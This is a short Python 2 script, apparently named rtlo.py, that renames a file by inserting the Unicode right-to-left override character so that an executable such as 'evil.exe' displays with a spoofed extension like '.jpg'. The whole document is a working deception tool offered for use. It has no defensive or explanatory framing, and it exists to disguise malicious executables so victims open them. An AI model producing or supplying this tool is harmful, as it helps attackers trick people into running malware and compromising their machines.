#!/usr/bin/python

import os, sys

if len(sys.argv) < 3:
    print '[+] Please specify an input file and extension!'
    sys.exit()
elif sys.argv[1] == '-h':
    print '[!] Usage: python rtlo.py evil.exe jpg'
    sys.exit()

inputfile = sys.argv[1]
spoofed_extension = sys.argv[2]
exists = os.path.isfile(inputfile)

if not exists:
    print '[!] Input file does not exist!'
else:
    filename, extension = inputfile.split('.')
    reverse = spoofed_extension [::-1]
    newname = filename + u'\u202e' + reverse + '.' + extension
    newname.encode('utf-8')
    try:
        os.rename(inputfile, newname)
        print '[+] RTLO file created!'
    except:
        print '[!] Could not create file!'
